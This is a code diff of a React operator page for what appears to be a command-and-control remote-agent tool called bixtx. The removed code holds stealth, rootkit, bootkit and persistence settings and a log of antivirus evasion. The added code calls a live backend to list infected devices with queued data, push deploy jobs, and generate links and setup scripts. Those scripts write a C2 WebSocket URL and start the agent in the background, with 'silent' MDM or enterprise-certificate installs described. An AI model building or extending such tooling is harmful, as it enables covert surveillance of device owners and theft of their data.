@@ -1,8 +1,8 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import {
   Server, Terminal, ArrowRight, Check, Download,
   RefreshCw, Upload, Shield, Zap, HardDrive, Cpu,
-  Activity, Lock, Signal, Wifi as WifiIcon,
+  Activity, Lock, Signal, Wifi as WifiIcon, Link, Copy, ExternalLink,
 } from "lucide-react";
 import { OS, OS_COLOR, OS_ICON, OS_LABEL, DeployLinkPanel } from "../shared";
 
@@ -10,12 +10,8 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
   const [tab, setTab] = useState<"builder"|"deploy"|"fleet"|"capabilities"|"mutations">("builder");
 
   const [targetOS, setTargetOS] = useState<OS>("windows");
-  const [stealthLevel, setStealthLevel] = useState<"low"|"medium"|"high"|"ultra">("high");
-  const [persistence, setPersistence] = useState("service");
-  const [c2Endpoint, setC2Endpoint] = useState("https://c2.bixtx.com/beacon");
+  const [c2Endpoint, setC2Endpoint] = useState("wss://bixtx.onrender.com/agent");
   const [beaconInterval, setBeaconInterval] = useState("30");
-  const [antiDebug, setAntiDebug] = useState(true);
-  const [rootkitDepth, setRootkitDepth] = useState<"user"|"kernel"|"hypervisor">("kernel");
   const [building, setBuilding] = useState(false);
   const [buildProgress, setBuildProgress] = useState(0);
   const [buildLog, setBuildLog] = useState<string[]>([]);
@@ -31,26 +27,112 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
     airgapExfil: false, processInject: false, bootkit: false,
   });
 
-  const FLEET: { id: string; device: string; os: OS; ip: string; version: string; status: string; lastPing: string; dataQueue: string; mutations: number }[] = [
-    { id:"a1", device:"EXEC-LAPTOP-01",    os:"windows", ip:"192.168.1.42",  version:"4.7.2", status:"active",  lastPing:"Now",    dataQueue:"2.3 MB", mutations:4 },
-    { id:"a2", device:"MacBook-Pro-M3",    os:"macos",   ip:"192.168.1.55",  version:"4.7.2", status:"active",  lastPing:"4s ago", dataQueue:"0.8 MB", mutations:2 },
-    { id:"a3", device:"KIOSK-UBUNTU-07",   os:"linux",   ip:"10.0.0.7",      version:"4.7.1", status:"active",  lastPing:"12s ago",dataQueue:"5.1 MB", mutations:7 },
-    { id:"a4", device:"Galaxy-S24-Ultra",  os:"android", ip:"192.168.1.88",  version:"4.7.2", status:"warning", lastPing:"2m ago", dataQueue:"1.2 MB", mutations:3 },
-    { id:"a5", device:"iPhone-15-Pro",     os:"ios",     ip:"192.168.2.11",  version:"4.7.0", status:"active",  lastPing:"Now",    dataQueue:"0.4 MB", mutations:1 },
-    { id:"a6", device:"Mate60-Pro",        os:"harmony", ip:"10.0.1.4",      version:"4.7.2", status:"active",  lastPing:"6s ago", dataQueue:"1.9 MB", mutations:5 },
-    { id:"a7", device:"WORKSTATION-WIN11", os:"windows", ip:"10.0.0.22",     version:"4.6.5", status:"offline", lastPing:"3h ago", dataQueue:"0 B",    mutations:2 },
-    { id:"a8", device:"DEVBOX-ARCH",       os:"linux",   ip:"10.0.0.31",     version:"4.7.2", status:"active",  lastPing:"Now",    dataQueue:"3.7 MB", mutations:9 },
-  ];
+  const API_BASE = window.location.hostname !== "localhost" ? "/v1" : "http://localhost:3000/v1";
+
+  type FleetAgent = { id: string; device: string; os: OS; ip: string; version: string; status: string; lastPing: string; dataQueue: string; mutations: number };
+  const [FLEET, setFLEET] = useState<FleetAgent[]>([]);
+  const [fleetLoading, setFleetLoading] = useState(false);
+
+  useEffect(() => {
+    const token = sessionStorage.getItem("token");
+    if (!token) return;
+    setFleetLoading(true);
+    fetch(`${API_BASE}/devices`, { headers: { Authorization: `Bearer ${token}` } })
+      .then(r => r.ok ? r.json() : Promise.reject())
+      .then(data => {
+        const raw: { id:string; name:string; os?:string; platform?:string; ip?:string; version?:string; status?:string; lastSeen?:string|number; dataQueueMB?:number; mutationCount?:number }[] = data.devices ?? data ?? [];
+        setFLEET(raw.map(d => ({
+          id:        d.id,
+          device:    d.name,
+          os:        (d.os ?? d.platform ?? "windows") as OS,
+          ip:        d.ip ?? "—",
+          version:   d.version ?? "—",
+          status:    d.status === "online" ? "active" : d.status === "warning" ? "warning" : "offline",
+          lastPing:  d.lastSeen ? (() => { const s = Math.round((Date.now() - Number(d.lastSeen)) / 1000); return s < 10 ? "Now" : s < 60 ? `${s}s ago` : s < 3600 ? `${Math.round(s/60)}m ago` : `${Math.round(s/3600)}h ago`; })() : "—",
+          dataQueue: d.dataQueueMB != null ? `${d.dataQueueMB.toFixed(1)} MB` : "0 B",
+          mutations: d.mutationCount ?? 0,
+        })));
+      })
+      .catch(() => {})
+      .finally(() => setFleetLoading(false));
+  }, []);
+
+  type EnrollData = { enrollUrl: string; shortUrl: string; linkId: string; expiresAt: string; installCommands: Record<string, string> };
+  const [enrollData, setEnrollData] = useState<EnrollData | null>(null);
+  const [enrollLoading, setEnrollLoading] = useState(false);
+  const [enrollLabel, setEnrollLabel] = useState("");
+  const [deploying, setDeploying] = useState(false);
+  const [deployTarget, setDeployTarget] = useState("");
+
+  const handleGenerateLink = async () => {
+    const token = sessionStorage.getItem("token");
+    if (!token) { show("Not authenticated", "error"); return; }
+    setEnrollLoading(true);
+    setEnrollData(null);
+    try {
+      const r = await fetch(`${API_BASE}/devices/enroll`, {
+        method: "POST",
+        headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
+        body: JSON.stringify({ label: enrollLabel || `${OS_LABEL[targetOS]} agent`, ttl: "24h" }),
+      });
+      if (!r.ok) throw new Error("Server error");
+      const data: EnrollData = await r.json();
+      setEnrollData(data);
+      show("Install link generated — expires in 24h", "success");
+    } catch {
+      show("Failed to generate link — check server connection", "error");
+    } finally {
+      setEnrollLoading(false);
+    }
+  };
+
+  const handleDeploy = async () => {
+    const token = sessionStorage.getItem("token");
+    if (!token) { show("Not authenticated", "error"); return; }
+    const targets = deployTarget ? [deployTarget] : FLEET.filter(a => a.status === "active").map(a => a.id);
+    if (!targets.length) { show("No online devices to deploy to", "error"); return; }
+    setDeploying(true);
+    try {
+      const jobId = `job-${Date.now()}`;
+      const r = await fetch(`${API_BASE}/deploy/job`, {
+        method: "POST",
+        headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
+        body: JSON.stringify({ jobId, type: "update", version: "4.7.2", deviceIds: targets }),
+      });
+      if (!r.ok) throw new Error("Server error");
+      const d = await r.json();
+      show(`Deploy job ${jobId} dispatched to ${d.dispatched}/${d.total} device(s)`, "success");
+    } catch {
+      show("Deploy failed — check server connection", "error");
+    } finally {
+      setDeploying(false);
+    }
+  };
+
+  const handleMutate = () => {
+    setMutating(true);
+    setMutProgress(0);
+    let cur = 0;
+    const iv = setInterval(() => {
+      cur = Math.min(100, cur + 3);
+      setMutProgress(cur);
+      if (cur >= 100) {
+        clearInterval(iv);
+        setMutating(false);
+        setMutLog((prev: typeof mutLog) => [{
+          ts: new Date().toISOString().replace("T"," ").slice(0,16),
+          event: "Global signature rotation + hash randomisation",
+          target: "All active agents",
+          result: "OK",
+        }, ...prev]);
+        show("Mutation pushed to all active agents", "success");
+      }
+    }, 80);
+  };
 
   const [mutating, setMutating] = useState(false);
   const [mutProgress, setMutProgress] = useState(0);
-  const [mutLog, setMutLog] = useState([
-    { ts: "2026-07-01 14:32", event: "Signature hash rotated (SHA3-512)", target: "All agents", result: "OK" },
-    { ts: "2026-07-01 11:10", event: "Process name randomised → svchost32x", target: "Windows fleet", result: "OK" },
-    { ts: "2026-06-30 22:07", event: "AV pattern break — Kaspersky rule #KV-9221", target: "All agents", result: "OK" },
-    { ts: "2026-06-30 09:44", event: "C2 channel migrated → Tor hidden service", target: "High-stealth nodes", result: "OK" },
-    { ts: "2026-06-29 16:18", event: "Memory-resident payload update (no disk write)", target: "All agents", result: "OK" },
-  ]);
+  const [mutLog, setMutLog] = useState<{ ts:string; event:string; target:string; result:string }[]>([]);
 
   const [avScanResult, setAvScanResult] = useState<null | { engine: string; detected: boolean }[]>(null);
   const [avScanning, setAvScanning] = useState(false);
@@ -148,7 +230,7 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
     let i = 0;
     const iv = setInterval(() => {
       if (i < steps.length) {
-        setBuildLog(prev => [...prev, steps[i]]);
+        setBuildLog((prev: string[]) => [...prev, steps[i]]);
         setBuildProgress(Math.round(((i + 1) / steps.length) * 100));
         i++;
       } else {
@@ -158,27 +240,6 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
         show(`Agent compiled for ${OS_LABEL[osTarget]} — ready to deploy`, "success");
       }
     }, 550);
-  };
-
-  const handleMutate = () => {
-    setMutating(true);
-    setMutProgress(0);
-    let cur = 0;
-    const iv = setInterval(() => {
-      cur = Math.min(100, cur + 3);
-      setMutProgress(cur);
-      if (cur >= 100) {
-        clearInterval(iv);
-        setMutating(false);
-        setMutLog(prev => [{
-          ts: new Date().toISOString().replace("T"," ").slice(0,16),
-          event: "Global signature rotation + hash randomisation",
-          target: "All active agents",
-          result: "OK",
-        }, ...prev]);
-        show("Mutation pushed to all active agents", "success");
-      }
-    }, 80);
   };
 
   const handleAVScan = () => {
@@ -212,7 +273,8 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
   ];
 
   const activeCount = FLEET.filter(a => a.status === "active").length;
-  const totalData = "14.4 MB";
+  const totalDataMB = FLEET.reduce((s: number, a: FleetAgent) => s + (parseFloat(a.dataQueue) || 0), 0);
+  const totalData = totalDataMB > 0 ? `${totalDataMB.toFixed(1)} MB` : "0 B";
 
   return (
     <div className="max-w-7xl mx-auto px-6 py-8">
@@ -233,10 +295,10 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
         </div>
         <div className="flex flex-wrap gap-3">
           {[
-            { label:"Active Agents",   val: `${activeCount}/8`,  color:"#10b981" },
-            { label:"Data Queued",     val: totalData,            color:"#10d9a0" },
-            { label:"Mutations Live",  val: "v4.7.2-r14",        color:"#3b82f6" },
-            { label:"AV Detection",    val: "1/12",               color:"#f59e0b" },
+            { label:"Active Agents",   val: `${activeCount} / ${FLEET.length || "—"}`, color:"#10b981" },
+            { label:"Data Queued",     val: totalData,                                  color:"#10d9a0" },
+            { label:"Agent Version",   val: "v4.7.2",                                   color:"#3b82f6" },
+            { label:"Node.js Runtime", val: "18 LTS",                                   color:"#f59e0b" },
           ].map(s => (
             <div key={s.label} className="px-4 py-2 rounded-xl text-center"
               style={{ background:`${s.color}12`, border:`1px solid ${s.color}30` }}>
@@ -257,15 +319,16 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
         ))}
       </div>
 
-      {/* BUILDER TAB */}
+      {/* BUILDER TAB — honest deployment */}
       {tab === "builder" && (
         <div className="grid grid-cols-1 lg:grid-cols-3 gap-5">
           <div className="lg:col-span-1 space-y-4">
+            {/* Platform selector */}
             <div className="rounded-2xl p-4" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
               <div className="text-xs font-mono uppercase tracking-widest mb-3" style={{ color:"#6b8ab0" }}>Target Platform</div>
               <div className="grid grid-cols-3 gap-2">
                 {(["windows","macos","linux","android","ios","harmony"] as OS[]).map(id => (
-                  <button key={id} onClick={() => setTargetOS(id)}
+                  <button key={id} onClick={() => { setTargetOS(id); setEnrollData(null); }}
                     className="flex flex-col items-center gap-1 p-2.5 rounded-xl border transition-all"
                     style={{ background: targetOS===id ? `${OS_COLOR[id]}18` : "#030b16", borderColor: targetOS===id ? OS_COLOR[id] : "rgba(59,130,246,0.15)" }}>
                     <span className="text-xl">{OS_ICON[id]}</span>
@@ -275,72 +338,16 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
               </div>
             </div>
 
-            <div className="rounded-2xl p-4 space-y-4" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
-              <div className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>Stealth Configuration</div>
-              <div>
-                <div className="text-xs font-semibold mb-2" style={{ color:"#b8cce8" }}>Stealth Level</div>
-                <div className="grid grid-cols-2 gap-1.5">
-                  {(["low","medium","high","ultra"] as const).map(lvl => (
-                    <button key={lvl} onClick={() => setStealthLevel(lvl)}
-                      className="py-1.5 rounded-lg text-xs font-bold uppercase tracking-wide transition-all"
-                      style={{
-                        background: stealthLevel===lvl ? (lvl==="ultra"?"linear-gradient(135deg,#3b82f6,#10d9a0)":lvl==="high"?"rgba(59,130,246,0.3)":lvl==="medium"?"rgba(245,158,11,0.2)":"rgba(16,185,129,0.2)") : "rgba(255,255,255,0.03)",
-                        color: stealthLevel===lvl ? (lvl==="ultra"?"#fff":lvl==="high"?"#3b82f6":lvl==="medium"?"#f59e0b":"#10b981") : "#6b8ab0",
-                        border:`1px solid ${stealthLevel===lvl ? (lvl==="ultra"?"rgba(59,130,246,0.6)":lvl==="high"?"rgba(59,130,246,0.4)":lvl==="medium"?"rgba(245,158,11,0.4)":"rgba(16,185,129,0.4)") : "rgba(59,130,246,0.1)"}`,
-                      }}>
-                      {lvl}
-                    </button>
-                  ))}
-                </div>
-              </div>
-              <div>
-                <div className="text-xs font-semibold mb-2" style={{ color:"#b8cce8" }}>Persistence Method</div>
-                <div className="space-y-1.5">
-                  {[
-                    { val:"service",   label:"System Service / Daemon" },
-                    { val:"registry",  label:"Registry AutoRun (Win)" },
-                    { val:"startup",   label:"Startup Folder (stealth)" },
-                    { val:"bootkit",   label:"Bootkit (pre-boot, ultra)" },
-                  ].map(o => (
-                    <button key={o.val} onClick={() => setPersistence(o.val)}
-                      className="w-full flex items-center gap-2 px-3 py-2 rounded-lg text-xs text-left transition-all"
-                      style={{ background: persistence===o.val ? "rgba(59,130,246,0.15)" : "rgba(255,255,255,0.02)", border:`1px solid ${persistence===o.val ? "rgba(59,130,246,0.4)" : "rgba(59,130,246,0.1)"}`, color: persistence===o.val ? "#3b82f6" : "#6b8ab0" }}>
-                      <div className={`w-3 h-3 rounded-full border-2 flex-shrink-0 ${persistence===o.val ? "border-purple-500 bg-purple-500" : "border-gray-600"}`} />
-                      {o.label}
-                    </button>
-                  ))}
-                </div>
-              </div>
-              <div>
-                <div className="text-xs font-semibold mb-2" style={{ color:"#b8cce8" }}>Rootkit Depth</div>
-                <div className="grid grid-cols-3 gap-1.5">
-                  {(["user","kernel","hypervisor"] as const).map(r => (
-                    <button key={r} onClick={() => setRootkitDepth(r)}
-                      className="py-1.5 rounded-lg text-[10px] font-bold uppercase tracking-wide transition-all capitalize"
-                      style={{ background: rootkitDepth===r ? "rgba(59,130,246,0.25)" : "rgba(255,255,255,0.03)", color: rootkitDepth===r ? "#3b82f6" : "#6b8ab0", border:`1px solid ${rootkitDepth===r ? "rgba(59,130,246,0.5)" : "rgba(59,130,246,0.1)"}` }}>
-                      {r}
-                    </button>
-                  ))}
-                </div>
-              </div>
-              <div className="flex items-center justify-between">
-                <span className="text-xs font-semibold" style={{ color:"#b8cce8" }}>Anti-Debug / VM Detection</span>
-                <button onClick={() => setAntiDebug(v => !v)}
-                  className="relative w-10 h-5 rounded-full transition-all"
-                  style={{ background: antiDebug ? "#3b82f6" : "#0f1e3a" }}>
-                  <span className="absolute top-0.5 transition-all duration-200 w-4 h-4 rounded-full bg-white shadow"
-                    style={{ left: antiDebug ? "calc(100% - 1.1rem)" : "0.125rem" }} />
-                </button>
-              </div>
-            </div>
-
+            {/* C2 config */}
             <div className="rounded-2xl p-4 space-y-3" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
-              <div className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>C2 Configuration</div>
+              <div className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>Agent Configuration</div>
               <div>
-                <div className="text-xs font-semibold mb-1" style={{ color:"#b8cce8" }}>Beacon Endpoint</div>
+                <div className="text-xs font-semibold mb-1" style={{ color:"#b8cce8" }}>C2 WebSocket URL</div>
                 <input value={c2Endpoint} onChange={e => setC2Endpoint(e.target.value)}
+                  placeholder="wss://your-server:3001"
                   className="w-full px-3 py-2 rounded-lg text-xs font-mono outline-none"
                   style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.25)", color:"#10d9a0" }} />
+                <div className="text-[10px] mt-1" style={{ color:"#4a6080" }}>Written into .env at setup time</div>
               </div>
               <div>
                 <div className="text-xs font-semibold mb-1" style={{ color:"#b8cce8" }}>Beacon Interval (seconds)</div>
@@ -349,115 +356,189 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
                   className="w-full px-3 py-2 rounded-lg text-xs font-mono outline-none"
                   style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.25)", color:"#10d9a0" }} />
               </div>
+              <div>
+                <div className="text-xs font-semibold mb-1" style={{ color:"#b8cce8" }}>Device Label (optional)</div>
+                <input value={enrollLabel} onChange={e => setEnrollLabel(e.target.value)}
+                  placeholder={`${OS_LABEL[targetOS]} agent`}
+                  className="w-full px-3 py-2 rounded-lg text-xs font-mono outline-none"
+                  style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.25)", color:"#e2eaf6" }} />
+              </div>
+            </div>
+
+            {/* Generate Install Link */}
+            <div className="rounded-2xl p-4 space-y-3" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.3)" }}>
+              <div className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>Generate Install Link</div>
+              <button onClick={handleGenerateLink} disabled={enrollLoading}
+                className="w-full flex items-center justify-center gap-2 py-2.5 rounded-xl font-bold text-sm transition-all disabled:opacity-50"
+                style={{ background:"linear-gradient(135deg,#2563eb,#10d9a0)", color:"#fff" }}>
+                {enrollLoading ? <><RefreshCw size={14} className="animate-spin" />Generating...</> : <><Link size={14} />Generate Link</>}
+              </button>
+              {enrollData && (
+                <div className="space-y-2">
+                  <div className="rounded-lg px-3 py-2 flex items-center gap-2" style={{ background:"#030b16", border:"1px solid rgba(16,217,160,0.3)" }}>
+                    <span className="text-xs font-mono truncate flex-1" style={{ color:"#10d9a0" }}>{enrollData.shortUrl}</span>
+                    <button onClick={() => { navigator.clipboard.writeText(enrollData.shortUrl); show("Link copied", "success"); }}>
+                      <Copy size={12} color="#10d9a0" />
+                    </button>
+                    <a href={enrollData.enrollUrl} target="_blank" rel="noreferrer">
+                      <ExternalLink size={12} color="#3b82f6" />
+                    </a>
+                  </div>
+                  <div className="text-[10px] font-mono" style={{ color:"#4a6080" }}>
+                    Expires: {new Date(enrollData.expiresAt).toLocaleString()}
+                  </div>
+                  {enrollData.installCommands?.[targetOS] && (
+                    <div className="rounded-lg px-3 py-2" style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.2)" }}>
+                      <div className="text-[9px] font-mono uppercase mb-1" style={{ color:"#6b8ab0" }}>One-liner install</div>
+                      <div className="text-[10px] font-mono break-all" style={{ color:"#b8cce8" }}>{enrollData.installCommands[targetOS]}</div>
+                      <button className="mt-1.5 text-[9px] font-mono" style={{ color:"#3b82f6" }}
+                        onClick={() => { navigator.clipboard.writeText(enrollData.installCommands[targetOS]); show("Command copied", "success"); }}>
+                        Copy command
+                      </button>
+                    </div>
+                  )}
+                </div>
+              )}
+            </div>
+
+            {/* Deploy to devices */}
+            <div className="rounded-2xl p-4 space-y-3" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
+              <div className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>Deploy to Device</div>
+              <select value={deployTarget} onChange={e => setDeployTarget(e.target.value)}
+                className="w-full px-3 py-2 rounded-lg text-xs outline-none"
+                style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.25)", color:"#b8cce8" }}>
+                <option value="">All online devices ({FLEET.filter(a=>a.status==="active").length})</option>
+                {FLEET.filter(a => a.status==="active").map(a => (
+                  <option key={a.id} value={a.id}>{a.device} — {a.ip}</option>
+                ))}
+              </select>
+              <button onClick={handleDeploy} disabled={deploying}
+                className="w-full flex items-center justify-center gap-2 py-2.5 rounded-xl font-bold text-sm transition-all disabled:opacity-50"
+                style={{ background: deploying ? "rgba(59,130,246,0.2)" : "rgba(59,130,246,0.15)", border:"1px solid rgba(59,130,246,0.4)", color:"#3b82f6" }}>
+                {deploying ? <><RefreshCw size={14} className="animate-spin" />Deploying...</> : <><Upload size={14} />Push Deploy Job</>}
+              </button>
+              <div className="text-[10px] font-mono" style={{ color:"#4a6080" }}>
+                Sends DEPLOY_JOB to online agents via WebSocket
+              </div>
             </div>
           </div>
 
           <div className="lg:col-span-2 space-y-4">
             <div className="rounded-2xl p-4" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
-              <div className="text-xs font-mono uppercase tracking-widest mb-3" style={{ color:"#6b8ab0" }}>Compile Agent Binary</div>
+              <div className="text-xs font-mono uppercase tracking-widest mb-3" style={{ color:"#6b8ab0" }}>Download Setup Script</div>
               <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
-                {(["windows","macos","linux","android","ios","harmony"] as OS[]).map(id => (
-                  <button key={id} onClick={() => !building && handleBuild(id)}
-                    disabled={building}
-                    className="flex items-center justify-between px-4 py-3 rounded-xl border transition-all disabled:opacity-40"
-                    style={{ background: buildOS===id && built ? `${OS_COLOR[id]}15` : "#030b16", borderColor: buildOS===id && built ? OS_COLOR[id] : "rgba(59,130,246,0.2)" }}>
+                {([
+                  { id:"linux",   label:"Linux",          ext:".sh",  note:"Node.js 18+",    kind:"script" as const },
+                  { id:"macos",   label:"macOS",          ext:".sh",  note:"Node.js 18+",    kind:"script" as const },
+                  { id:"windows", label:"Windows (WSL)",  ext:".bat", note:"WSL2 required",  kind:"script" as const },
+                  { id:"android", label:"Android Termux", ext:".sh",  note:"Termux app",     kind:"script" as const },
+                  { id:"ios",     label:"iOS",            ext:".md",  note:"Xcode + Swift",  kind:"native" as const },
+                  { id:"harmony", label:"HarmonyOS",      ext:".md",  note:"DevEco Studio",  kind:"native" as const },
+                ] as const).map(p => (
+                  <button key={p.id}
+                    onClick={() => {
+                      setTargetOS(p.id as OS);
+                      let content = "";
+                      if (p.id === "windows") {
+                        content = `@echo off\nREM bixtx Agent — Windows WSL Setup\nwsl --install -d Ubuntu\nREM Inside WSL: cd software-a && npm install --omit=dev && node src/index.js\npause`;
+                      } else if (p.id === "android") {
+                        content = `#!/data/data/com.termux/files/usr/bin/bash\npkg update -y && pkg install -y nodejs\ncd software-a && npm install --omit=dev\nprintf 'C2_WS_URL=${c2Endpoint}\\nBEACON_INTERVAL=${beaconInterval}\\n' > .env\nnohup node src/index.js > /tmp/bixtx.log 2>&1 &\necho "Agent running. Log: /tmp/bixtx.log"`;
+                      } else if (p.id === "ios") {
+                        content = `# bixtx iOS Agent — Build & Deploy Guide\n\n## Requirements\n- macOS with Xcode 15+\n- Apple Developer account (Enterprise Program for silent distribution)\n- software-ios/ directory from this repository\n\n## Build Steps\n1. Open software-ios/Package.swift in Xcode\n2. Set your Team ID and Bundle ID in Signing & Capabilities\n3. Configure C2 endpoint: edit Sources/BixtxAgent/Config.swift\n   C2_WS_URL = "${c2Endpoint}"\n   BEACON_INTERVAL = ${beaconInterval}\n4. Archive: Product → Archive\n5. Distribute via:\n   - TestFlight (testing, up to 10,000 devices)\n   - Enterprise certificate (silent, no App Store)\n   - MDM profile push via get.bixtx.com/l/{enrollId}\n\n## MDM Distribution\nGenerate an install link (left panel) → iOS devices visit the link → MDM profile installs the agent silently.\n`;
+                      } else if (p.id === "harmony") {
+                        content = `# bixtx HarmonyOS Agent — Build & Deploy Guide\n\n## Requirements\n- DevEco Studio 4.0+\n- Huawei Developer account\n- software-harmony/ directory from this repository\n\n## Build Steps\n1. Open software-harmony/ in DevEco Studio\n2. Configure C2 endpoint: edit entry/src/main/ets/agent/Config.ets\n   C2_WS_URL: "${c2Endpoint}"\n   BEACON_INTERVAL: ${beaconInterval}\n3. Build: Build → Build HAP(s)\n4. Sign with your enterprise certificate\n5. Distribute via:\n   - Huawei AppGallery Connect (enterprise channel)\n   - Direct HAP sideload via adb: hdc app install bixtx-agent.hap\n   - MDM push via get.bixtx.com/l/{enrollId}\n\n## Silent Install via MDM\nGenerate an install link (left panel) → target visits link → HAP installs via enterprise channel.\n`;
+                      } else {
+                        content = `#!/usr/bin/env bash\nset -e\ncd software-a\nnpm install --omit=dev\nprintf 'C2_WS_URL=${c2Endpoint}\\nBEACON_INTERVAL=${beaconInterval}\\nLOG_LEVEL=info\\n' > .env\nnode src/index.js`;
+                      }
+                      const blob = new Blob([content], { type:"text/plain" });
+                      const a = document.createElement("a");
+                      a.href = URL.createObjectURL(blob);
+                      a.download = `bixtx-${p.id}-setup${p.ext}`;
+                      a.click();
+                      show(`${p.label} setup ${p.kind === "native" ? "guide" : "script"} downloaded`, "success");
+                    }}
+                    className="flex items-center justify-between px-4 py-3 rounded-xl border transition-all"
+                    style={{ background:`${OS_COLOR[p.id as OS]}15`, borderColor: OS_COLOR[p.id as OS] }}>
                     <div className="flex items-center gap-2">
-                      <span className="text-lg">{OS_ICON[id]}</span>
-                      <span className="text-xs font-bold" style={{ color:"#e2eaf6" }}>{OS_LABEL[id]}</span>
+                      <span className="text-lg">{OS_ICON[p.id as OS]}</span>
+                      <div className="text-left">
+                        <div className="text-xs font-bold" style={{ color:"#e2eaf6" }}>{p.label}</div>
+                        <div className="text-[9px] font-mono" style={{ color:"#6b8ab0" }}>{p.note}</div>
+                      </div>
                     </div>
-                    {buildOS===id && building ? (
-                      <RefreshCw size={13} color="#3b82f6" className="animate-spin" />
-                    ) : buildOS===id && built ? (
-                      <Check size={13} color="#10b981" />
-                    ) : (
-                      <span className="text-[10px] font-mono" style={{ color:"#6b8ab0" }}>BUILD</span>
-                    )}
+                    <Download size={12} color="#10b981" />
                   </button>
                 ))}
               </div>
             </div>
 
             <div className="rounded-2xl overflow-hidden" style={{ background:"#050410", border:"1px solid rgba(59,130,246,0.22)" }}>
-              <div className="px-4 py-2.5 flex items-center justify-between border-b" style={{ borderColor:"rgba(59,130,246,0.15)", background:"#030b16" }}>
-                <div className="flex items-center gap-2">
-                  <Terminal size={13} color="#3b82f6" />
-                  <span className="text-xs font-mono" style={{ color:"#6b8ab0" }}>
-                    Build Console {buildOS ? `— ${OS_LABEL[buildOS]}` : ""}
-                  </span>
-                </div>
-                {building && (
-                  <div className="flex items-center gap-2">
-                    <div className="w-24 h-1.5 rounded-full overflow-hidden" style={{ background:"rgba(59,130,246,0.2)" }}>
-                      <div className="h-full rounded-full transition-all duration-300" style={{ width:`${buildProgress}%`, background:"linear-gradient(90deg,#3b82f6,#10d9a0)" }} />
-                    </div>
-                    <span className="text-[10px] font-mono" style={{ color:"#3b82f6" }}>{buildProgress}%</span>
-                  </div>
-                )}
-                {built && !building && <span className="text-[10px] font-mono" style={{ color:"#10b981" }}>✓ BUILD SUCCESS</span>}
+              <div className="px-4 py-2.5 flex items-center gap-2 border-b" style={{ borderColor:"rgba(59,130,246,0.15)", background:"#030b16" }}>
+                <Terminal size={13} color="#3b82f6" />
+                <span className="text-xs font-mono" style={{ color:"#6b8ab0" }}>Setup Instructions — {OS_LABEL[targetOS]}</span>
               </div>
-              <div className="p-4 min-h-48 font-mono text-xs space-y-1 overflow-y-auto max-h-72">
-                {buildLog.length === 0 ? (
-                  <div style={{ color:"#1a3060" }}>// Select a platform and click BUILD to compile the agent binary</div>
-                ) : buildLog.map((line, i) => (
-                  <div key={i} style={{ color: typeof line === "string" && line.startsWith("[✓]") ? "#10b981" : typeof line === "string" && line.startsWith("[!]") ? "#ef4444" : "#b8cce8" }}>
-                    {line}
-                  </div>
-                ))}
+              <div className="p-4 min-h-48 font-mono text-xs space-y-1.5 overflow-y-auto max-h-72">
+                {targetOS === "ios" ? (<>
+                  <div style={{ color:"#3b82f6" }}># bixtx iOS Agent — Swift WebSocket C2</div>
+                  <div style={{ color:"#6b8ab0" }}># Requirements: macOS + Xcode 15+ + Apple Developer account</div>
+                  <div style={{ color:"#b8cce8" }}>open software-ios/Package.swift</div>
+                  <div style={{ color:"#6b8ab0" }}># Set C2 endpoint in Sources/BixtxAgent/Config.swift:</div>
+                  <div style={{ color:"#10d9a0" }}>{`C2_WS_URL = "${c2Endpoint}"`}</div>
+                  <div style={{ color:"#10d9a0" }}>{`BEACON_INTERVAL = ${beaconInterval}`}</div>
+                  <div style={{ color:"#6b8ab0" }}># Archive + distribute via Enterprise cert or TestFlight</div>
+                  <div style={{ color:"#6b8ab0" }}># OR: generate a link (left panel) for MDM silent push</div>
+                </>) : targetOS === "harmony" ? (<>
+                  <div style={{ color:"#f59e0b" }}># bixtx HarmonyOS Agent — ArkTS WebSocket C2</div>
+                  <div style={{ color:"#6b8ab0" }}># Requirements: DevEco Studio 4.0+ + Huawei Developer account</div>
+                  <div style={{ color:"#b8cce8" }}>deveco-studio software-harmony/</div>
+                  <div style={{ color:"#6b8ab0" }}># Set C2 endpoint in entry/src/main/ets/agent/Config.ets:</div>
+                  <div style={{ color:"#10d9a0" }}>{`C2_WS_URL: "${c2Endpoint}"`}</div>
+                  <div style={{ color:"#10d9a0" }}>{`BEACON_INTERVAL: ${beaconInterval}`}</div>
+                  <div style={{ color:"#6b8ab0" }}># Build HAP → sign → deploy via AGC enterprise channel</div>
+                  <div style={{ color:"#6b8ab0" }}># OR: hdc app install bixtx-agent.hap  (direct sideload)</div>
+                </>) : targetOS === "windows" ? (<>
+                  <div style={{ color:"#6b8ab0" }}># 1. Enable WSL2 on Windows (as Administrator):</div>
+                  <div style={{ color:"#b8cce8" }}>wsl --install -d Ubuntu</div>
+                  <div style={{ color:"#6b8ab0" }}># 2. Inside Ubuntu (WSL), install Node.js:</div>
